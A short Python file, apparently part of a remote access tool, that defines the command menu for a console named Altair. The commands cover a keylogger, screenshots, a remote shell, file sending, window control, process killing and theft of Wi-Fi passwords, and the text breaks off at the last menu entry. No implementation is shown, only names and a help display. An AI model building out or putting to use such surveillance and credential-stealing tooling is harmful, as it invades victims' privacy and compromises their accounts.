from util import Console

class AltairCommandList:
    INFO = "get-info"
    EXIT = "exit"
    KEY_LOGGER = "k-lgr"
    SS = "get-screen_s"
    INCLUDE_SHELL = "i-shell"
    HELP = "help"
    SEND_FILE = "send-file"
    WIN_MAP = "win-map"
    M_POS = "m.pos"
    HELPER = f"""{Console.CYAN}\t    ╰──/{Console.DEFAULT}{INFO}{Console.CYAN}        [{Console.GREEN}INFORMATION{Console.CYAN}]
       ╰──/{Console.DEFAULT}{EXIT}{Console.CYAN}    \t\t[{Console.GREEN}EXIT{Console.CYAN}]
       ╰──/{Console.DEFAULT}{KEY_LOGGER}{Console.CYAN}   \t\t[{Console.GREEN}KEYLOGGER{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SS}{Console.CYAN}\t[{Console.GREEN}SCREEN-SHOT{Console.CYAN}]
       ╰──/{Console.DEFAULT}{INCLUDE_SHELL}{Console.CYAN}      \t[{Console.GREEN}INCLUDE-SHELL{Console.CYAN}]
       ╰──/{Console.DEFAULT}{WIN_MAP}{Console.CYAN}      \t[{Console.GREEN}WINDOWS-MANUPULATION{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SEND_FILE}{Console.CYAN}      \t[{Console.GREEN}SEND-FILE{Console.CYAN}]""".expandtabs(4)

    HELPER_C = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN}
\t╰──/{Console.DEFAULT}kill{Console.CYAN}
\t╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN}
\t╰──/{Console.DEFAULT}e--""".expandtabs(14)